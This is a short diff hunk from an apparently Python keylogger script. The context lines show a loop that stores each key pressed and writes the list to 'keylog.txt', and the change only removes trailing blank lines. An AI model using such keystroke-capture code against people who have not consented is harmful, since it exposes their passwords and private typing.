@@ -23,5 +23,3 @@ while True:
         key_list.append(event.name)
         with open("keylog.txt", "w") as f:
             f.write(str(key_list))
-
-    
